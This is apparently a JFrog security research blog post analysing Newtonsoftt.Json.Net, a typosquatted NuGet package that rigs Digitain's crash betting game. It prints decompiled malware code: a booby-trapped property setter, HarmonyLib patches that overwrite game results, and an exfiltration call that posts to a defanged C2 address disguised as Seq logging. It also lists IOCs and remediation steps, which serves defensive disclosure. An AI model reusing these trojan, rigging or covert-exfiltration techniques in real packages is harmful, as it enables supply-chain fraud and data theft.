---
schema_version: "1.0.0"
document_id: "8ebcbbfb15007f3ea2ef86a7cf424df4fc7c35b84c2acc7295cd0f31a42c08d1"
company_key: "jfrog-ltd-ordinary-shares"
company: "JFrog Ltd."
source_id: "jfrog-ltd-ordinary-shares-rss-4486f0fc66d1"
canonical_url: "https://jfrog.com/blog/nuget-typosquat-targets-betting-platform/"
published_at: "2026-07-21T13:16:05+00:00"
first_seen_at: "2026-07-21T14:34:15.171812+00:00"
fetched_at: "2026-07-28T20:34:24.680558+00:00"
content_hash: "sha256:1b6002d3f1a85d6a1772c55682231ac37a291bb936f28b7efde18b24b743fb3a"
---

# The Perfect Heist: NuGet Typosquat Targets Betting Platform to Rig Results

The JFrog Security Research team has discovered and disclosed a typosquatted NuGet package named[Newtonsoftt.Json.Net](https://www.nuget.org/packages/Newtonsoftt.Json.Net/11.0.11) . Note the double t and the .Net suffix. This package has been masquerading as the popular` Newtonsoft.Json` library while quietly shipping a trojanized fork. The trojan rigs **Digitain** , an online betting platform, and in later generations, exfiltrates rigged round results to an attacker-controlled server, utilizing the header` X-Seq-ApiKey: theperfectheist2025` . The author published seven versions under the same package, all sharing the same target-specific payload.


This case is not the usual generic info-stealer, it is a precision fraud tool aimed at a single company, and it works as a fully functional JSON library for everyone else. Developers who install it by typo get a real, working` Newtonsoft.Json` build; the malicious behavior begins after the host initializes` JsonConvert.DefaultSettings` , and can only succeed on systems that expose the target’s specific game backend method, and only after a delay.


*Newtonsoftt.Json.Net, version 11.0.11, live on NuGet*


The package was available and discoverable from August 2025 to October 2025, since then, the user has “unlisted” the package, meaning that on[NuGet search](https://www.nuget.org/packages?q=Newtonsoftt.Json.Net) it will not appear to users. Though it is unlisted, at the time of this writing, all artifacts are available for download on the[package’s page](https://www.nuget.org/packages/Newtonsoftt.Json.Net/11.0.11) .


*Search results for the malicious package in NuGet after the user unlisted it*


## The Bait: A Working JSON Library with a Forged Identity


The package’s metadata is a carefully crafted impersonation. The` nuspec` lists the author as` James Newton-King` , points the project URL at` https://www.newtonsoft.com/json` , claims the MIT license, sets the title to` Json.NET` , tags the package` json` , and uses a version scheme (` 11.0.x` ) that looks like a plausible Json.NET release to anyone glancing at it. The real` Newtonsoft.Json` is on the` 13.x` line, but` 11.x` is recent enough to look unremarkable in a dependency graph per below:


```text


<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
<metadata minClientVersion="2.12">
<id>Newtonsoftt.Json.Net</id>
<version>11.0.11</version>
<title>Json.NET</title>
<authors>James Newton-King</authors>
<!-- ... -->
<projectUrl>https://www.newtonsoft.com/json</projectUrl>
<description>Json.NET is a popular high-performance JSON framework for .NET</description>
<copyright>Copyright © James Newton-King 2008</copyright>
<tags>json</tags>
<!-- ... -->
</metadata>
</package>


```


Under` lib/net8.0/` the package ships three assemblies:


- ` Newtonsoft.Json.net.dll` – a trojanized fork of Newtonsoft.Json 13.0.3 that contains the trigger.
- ` Newtonsoft.Values.Net.dll` – the payload, imported by the JSON library so it loads into any process that uses it.
- ` 0Harmony.dll` – the upstream HarmonyLib runtime-patching library, bundled. It is dual-use infrastructure, not malware on its own.


*The bundled dll files inside the malicious NuGet package*


Because NuGet auto-references every assembly under` lib/net8.0/` , a developer who only intended to add a JSON library silently loads all three DLLs into their process. The forked JSON library behaves normally for serialization, which is the whole point, as the host application keeps working, tests pass, and nobody goes looking for a bug.


The single biggest tell in the metadata is also the one that **names the victim** . Every version’s` nuspec` leaks the same` repository` URL. That is an internal TFS server belonging to **Digitain** , pointing at a project called` BetOnGames / FG-Crash` , a “Crash”-style betting game. The attacker did not need to spell out the target in the code, they shipped it in the supply-chain metadata seven times in a row.


*Attack flow of Newtonsoftt.Json.Net for affected hosts across the malware’s generations*


## The Evolution: Seven Versions, One Trojan, Three Generations


All seven published versions were analyzed. They are all builds of the same trojanized fork of Newtonsoft.Json 13.0.3, sharing the same trigger, the same Harmony patch target, and the same leaked TFS origin. What changes across versions is the obfuscation, the rigging strategy, and the exfiltration path. The payload evolved over three generations:


Version Obfuscator Generation Upload date


11.0.4 ConfuserEx (heavy) Gen-2 Aug 13, 2025


11.0.5 ConfuserEx (heavy) Gen-2 Aug 16, 2025


11.0.7 Dotfuscator Gen-1 Aug 16, 2025


11.0.8 Dotfuscator Gen-1 Aug 16, 2025


11.0.9 ConfuserEx (heavy) Gen-2 Aug 16, 2025


11.0.10 ConfuserEx (light) Gen-3 Oct 6, 2025


11.0.11 none Gen-3 Oct 10, 2025


The progression shows the author iteratively hardening the payload: **Gen-1** was a local-only rigging proof of concept; **Gen-2** added exfiltration but hid it behind reflection and ConfuserEx, **Gen-3** cleaned up the rigging and stabilized the exfiltration, with` 11.0.11` left completely unobfuscated, consistent with an accidental clean build being published.


A question that remains open is why the attacker would publish the Gen-1 variant after publishing several Gen-2 versions? And why was the Gen-3 version left un-obfuscated? Mistakes? Trial version of obfuscators expires? We can’t really tell, but what we can tell is that the intent was malicious, without a doubt.


## The Trigger: A Booby-Trapped Property Setter


The trojan package initiates itself via the` Newtonsoft.Json.Net.JsonConvert.DefaultSettings` property setter, a common Json.NET application startup configuration point. The setter is rewritten so that the user’s` ContractResolver` is silently discarded and replaced with the trojan’s own` CamelCasePropertyNamesContractResolver` , after which` DefaultValues.Set()` is called:


```text


public static Func<JsonSerializerSettings>? DefaultSettings
{
get => _defaultSettings;
set
{
_defaultSettings = value;
JsonConvert.DefaultSettings = () => new JsonSerializerSettings
{
ContractResolver = new CamelCasePropertyNamesContractResolver
{
NamingStrategy = new CamelCaseNamingStrategy { ProcessDictionaryKeys = false }
}
};
DefaultValues.Set();
}
}


```


Two covert malicious operations hide behind an innocent-looking property assignment: First, the host’s chosen resolver is replaced with the attacker’s, so serialization keeps “working” and nothing visibly breaks. Second,` DefaultValues.Set()` puts the Harmony patch on a **` Timer`** whose first fire is delayed: 10 minutes in Gen-3, and until the next day around 15:00 plus random jitter in Gen-1. **The delay is the hiding mechanism** . By the time the patch activates, the application has long since passed startup, logs look clean, and the operator is no longer watching the process.


This is why the trojan is rarely noticed. It is activated only after the application initializes` Json.NET` , and only on hosts that expose the specific target method. In the meantime, the patched game server keeps serving valid rounds.


## The Patch: Rigging` GenerateGameResult`


Across every generation of the malicious package, the payload uses HarmonyLib to patch a single method:


- **Type** :` Digitain.FG.SharedCrash.GameLogic.SharedCrashRules`
- **Method** :` GenerateGameResult`
- **Harmony instance id** :` com.example.harmony`


The Harmony instance id, the target type, and the method name are identical in every version. In the Dotfuscator and clean builds, these strings are present as base64 in the user string #US heap.


```text


if (H == null)
{
H = new Harmony(Encoding.UTF8.GetString("com.example.harmony"));
}
H.UnpatchAll();
MethodInfo original = AccessTools.Method(AccessTools.TypeByName(Encoding.UTF8.GetString("Digitain.FG.SharedCrash.GameLogic.SharedCrashRules")), Encoding.UTF8.GetString("GenerateGameResult"));
H.Patch(original, null, new HarmonyMethod(new Action<object>(TS)));


```


In the ConfuserEx builds, they are encrypted and only resolvable at runtime, but the structural fingerprint,` AccessTools.Method(AccessTools.TypeByName(<b64 type>), <b64 method>)` followed by` Harmony.Patch` , is present in every variant, proving the same target is patched throughout.


The rigging strategy differs by generation. Gen-1 uses a Harmony **transpiler** that rewrites the JIT-compiled IL of` GenerateGameResult` , locating the` decimal.op_GreaterThan / op_LessThan` comparison calls and the` Ldc_R8` crash-coefficient constant, then swapping the coefficient for an attacker value drawn from lookup tables indexed by (` month % 4, round counter, week-of-month` ):


```text


eval_b.a[index2].operand = OpCodes.Ldc_R8;
DateTime utcNow = DateTime.UtcNow;
int num4 = utcNow.Month % cs.Length;
eval_b.a[index2].operand = cs[num4][cu]
+ (double)utcNow.DayOfWeek * ct[num4][cu][(utcNow.Day - 1) / 7 % 4];
Console.WriteLine($"SET {eval_b.a[index2].operand}");


```


Gen-3 simplifies this to a Harmony **postfix** that overwrites the method’s return value directly, with no fragile IL rewriting:


```text


private static void TR(ref object __result)
{
if (++I < Values.L)
{
decimal num = (decimal)__result;
try
{
DateTime utcNow = DateTime.UtcNow;
int num2 = utcNow.Month % Values.Q.Length;
int num3 = ((utcNow.Hour != 22) ? 1 : 0);
__result = (decimal)(Values.Q[num2][num3][I]
+ (double)utcNow.DayOfWeek * Values.Z[num2][I][(utcNow.Day - 1) / 7 % 4]);
}
catch { __result = num; }
}
}


```


The replacement value is selected by the current UTC month, day-of-week, week-of-month, and an hour-dependent profile that treats **22:00 UTC** differently, using precomputed` Values.Q` and` Values.Z` tables.` Values.L` (` 32` in Gen-3,` 27` in Gen-1) bounds the number of rigged rounds before the patch unpatches itself. Rigged rounds are sprinkled among normal rounds on a deterministic schedule that only the attacker knows, so the manipulation is not obviously visible in aggregate round distributions.


By isolating the 22:00 UTC hour, the attacker creates a specialized **‘playbook’** that allows them to execute a different betting strategy during this window. This helps maintain unpredictability and allows for more complex rigging patterns that are harder to spot in aggregate game data.


## Exfiltration: Traffic Disguised as Seq Logging


Gen-3 (` 11.0.11` , unobfuscated) POSTs rigged results to a hardcoded C2 endpoint, with the URL, API key, and message template stored only as base64. The strings are presented below in their decoded, plaintext form for readability:


```text


StringContent stringContent = new StringContent(JsonSerializer.Serialize(new
{
Events = new[]
{
new
{
Timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
Level = "Information",
MessageTemplate = "Coefficient: {Result} | ThreadId: {ThreadId}",
Properties = new { Result = r, Source = "Coefficient", ThreadId = Environment.CurrentManagedThreadId }
}
}
}), Encoding.UTF8, "application/json");
stringContent.Headers.Add("X-Seq-ApiKey", "theperfectheist2025");
await _h.PostAsync("hxxp[:]//185[.]126[.]237[.]64:5341/api/events/raw", stringContent);


```


The C2 deliberately mimics a[Seq](https://datalust.co/seq) structured-logging server’s raw-ingest endpoint: Same path` /api/events/raw` , same` X-Seq-ApiKey` header, same Serilog event shape with` Level` ,` MessageTemplate` , and` Properties` . The intent is camouflage: An egress POST to a Seq-looking endpoint that reads like application telemetry, not malware traffic, especially in an environment that already uses structured logging.


*Newtonsoftt.Json.Net Gen-3 flow inside an affected host*


## Obfuscation: Patterns Across Generations


Obfuscation methods of Newtonsoftt.Json.Net across different malware generations:


Below is a summary of how, the malicious payload has evolved across multiple versions and generations:


**Gen-1** (` 11.0.7, 11.0.8` ) carries no networking at all. The capability set is just:


1. ` HarmonyLib.*`
2. ` AccessTools.TypeByName/Method/Patch/UnpatchAll`
3. ` Console.WriteLine`
4. ` Random.Shared.Next.`


The rigged coefficient is printed to the console with` Console.WriteLine($"SET {value}")` , a local debug print useful for an insider testing the patch on a development host but useless for an off-platform attacker. The target type and method are recoverable from the` #US` heap as plain base64.


**Gen-2** (` 11.0.4` ,` 11.0.5` ,` 11.0.9` ) adds exfiltration but hides it. The` Values.dll` metadata deliberately avoids any direct` System.Net.Http` ,` *` ,` Channel` , or` JsonSerializer` reference, instead it carries:


1. ` System.Reflection.MethodInfo.Invoke`
2. ` Assembly.Load`
3. ` ResolveMethod`
4. ` MakeGenericMethod, GetReferencedAssemblies`
5. ` GetType`
6. The fingerprint of a reflection-based loader that resolves` HttpClient.PostAsync` at runtime by name to keep the C2 call out of static metadata.


The actual URL and key are ConfuserEx-encrypted, so the literal C2 token is not in the binary.


**Gen-3** (11.0.10, 11.0.11) drops the fragile IL transpiler in favor of a clean postfix that overwrites` __result` directly.


- **11.0.10** keeps ConfuserEx-light obfuscation, renaming helper methods and encrypting constants while leaving payload class names readable. It refactors the exfiltration queue into an AsyncLocal<int?> paired with a ConcurrentDictionary<int,int> keyed by game ID. Its stealthier HTTP call bypasses the MemberRef table completely, utilizing DynamicMethod alongside MakeGenericMethod and ResolveMethod rather than Gen-2’s MethodInfo.Invoke.
- **11.0.11** , by contrast, ships entirely unobfuscated. The reliance on plain C# and base64-only strings is exactly what allowed the full C2 URL, API key, and Seq template to be recovered directly from the #US heap.


The ConfuserEx-encrypted constants in Gen-2 and Gen-3-light are not statically recoverable without running the decryptor.


Every variant carries the same` AccessTools.Method(AccessTools.TypeByName(<b64 type>)` ,` <b64 method>` ) to` Harmony.Patch(...)` pattern as` 11.0.11` , so the encrypted target string is the same Crash-game method, and the reflection-based networking fingerprint in Gen-2/3-light matches the direct` HttpClient.PostAsync` call visible in` 11.0.11` .


## Who is Affected by This NuGet Typosquat Attack?


The primary victim of the rigging is **Digitain / BetOnGames** , the operator of the` FG-Crash` betting game (` Digitain.FG.SharedCrash.GameLogic.SharedCrashRules` ). The attacker, potentially an insider or someone with access to the TFS repo` tfs.digitain.tools/.../FG-Crash` , gains prior knowledge and partial control of the crash multiplier on a schedule only they know.


The practical impact is:


- **Financial fraud** . Rigged betting rounds on a production gambling platform. The attacker can make specific rounds pay out to chosen players or guarantee house wins on schedule.
- **Data exfiltration (Gen-2/3)** . Every rigged result is sent to an external IP with an API key, giving the attacker an off-platform audit of the fraud and a covert channel to confirm the trojan is still running.
- **Supply-chain persistence** . The package masquerades as a core JSON library, so it persists across rebuilds for as long as the dependency reference is not corrected.


The trojan only activates when` JsonConvert.DefaultSettings` is assigned and only patches a method present in the FG-Crash backend. Non-targeted consumers may see only a working JSON library and no rigging behavior, which is exactly what makes this typosquat attack so effective.


There is no credential theft, persistence, or lateral-movement capability in the payload. Its sole purpose is to compromise the integrity of the crash game.


Other developers who installed this package may not even notice that they installed malware, or have any negative results in their application since it is only targeting a specific organization.


## Remediation steps


Here are our suggestions for remediation of this threat:


- Remove the` Newtonsoftt.Json.Net` dependency from every affected project and replace it with the official` Newtonsoft.Json` 13.0.3 (or newer) from` nuget.org` . Rebuild and redeploy from a clean restore.
- Purge cached copies: delete` newtonsoftt.json.net` from the global NuGet package cache (` ~/.nuget/packages/` ) and from any internal feed mirror so it cannot be re-resolved.
- Block and investigate the C2: add an egress block for` 185\[.\]126\[.\]237\[.\]64:5341` , and search historical network logs for past connections to determine the exposure window.
- Pin` Newtonsoft.Json` to a known-good version via` packages.lock.json` / centralized package version management, and consider a private feed allow-list to prevent typosquatted packages from resolving in future builds.


## Digitain’s Response


The[JFrog Security Research team](https://research.jfrog.com/) responsibly disclosed the malicious package to Digitain directly on July 7th, 2026, and received the following response on July 9th, 2026:


“Please be advised that we were already aware of the reported issue, and it has been resolved.”


This confirms that the incident was identified and addressed by the targeted organization. However, we have no details on whether the malicious package was ever successfully executed on their production servers, so the full extent of the exposure remains unknown.


## Takeaways


This NuGet Typosquat package is a sharp illustration of how much damage a single typo can do when the attacker knows the target. The double t in` Newtonsoftt` is the only visible difference from the real library, while the bundled JSON fork works correctly for everyone who is not the intended victim. The payload is activated only on hosts that expose a specific internal method, after a deliberate delay that takes it well past startup. For the vast majority of developers, the package is indistinguishable and operates exactly like the real thing. For Digitain, it is a threatening remote-controlled rigging of their production application.


The three-generation evolution also shows a savvy malicious actor iterating on detection evasion:


Local-only Dotfuscator PoC →
ConfuserEx-heavy builds that hide the C2 behind reflection and constant encryption →
Clean Gen-3 postfix that is small and stable →
Version` 11.0.11` that is shipped entirely unobfuscated


The larger lesson is that a package does not need broad malware behavior to be dangerous. A dependency can be benign for the most part, and still be catastrophic in the specific environment it was built to recognize.


To stay on top of the latest vulnerabilities, threats and attacks, make sure to bookmark the[Frog Security Research](https://research.jfrog.com/) portal.


---


This package has been detected by[JFrog Xray](https://jfrog.com/xray/) and[JFrog Curation](https://jfrog.com/curation//) , under the Xray IDs listed in the IOC section below:


## IOCs


Package:


- ` Newtonsoftt.Json.Net` (NuGet) – XRAY-1019668
- Versions observed:` 11.0.4, 11.0.5, 11.0.7, 11.0.8, 11.0.9, 11.0.10, 11.0.11` (faked to look like Json.NET 11.x; real Json.NET is 13.x)


Network IOCs:


- C2:` hxxp\[:\]//185\[.\]126\[.\]237\[.\]64:5341/api/events/raw`
- HTTP header:` X-Seq-ApiKey: theperfectheist2025`


Code / behavior IOCs:


- Harmony instance id:` com.example.harmony`
- Patched method:` Digitain.FG.SharedCrash.GameLogic.SharedCrashRules.GenerateGameResult`


**Bundled` lib/net8.0/Newtonsoft.Values.Net.dll` SHA256s (per version):**


- ` 11.0.4 3fbe32d76a22bda7a8fd3cdc6faf68807108f01d74ec8b346f4c5d4b61dbc84b`
- ` 11.0.5 fe498d584f43b7d6ebe2ebc34481d9b0e8e931d2af039f59451bf42effe8b461`
- ` 11.0.7 5d062e3e52d36d3e66f1c4b54e26149a5b552417f8cc360c390b568aaeb92678`
- ` 11.0.8 ba8f36968c8cdd9799c1d5e5619d1a5d6a0b1eabfd7876daa3cfdebd51dd4516`
- ` 11.0.9 c162009eda7579c3bf5f4fb1606368270c989433d8923d43e033bd5aefc8e335`
- ` 11.0.10 c386d416afef8319bf11c9180f6d35c0e1f7cb40b7a0c81b166c253afc623706`
- ` 11.0.11 4ed6e7b56abece2bef9cdddd0d10da2f8379a09ff94541ed0e70152f669c6682`
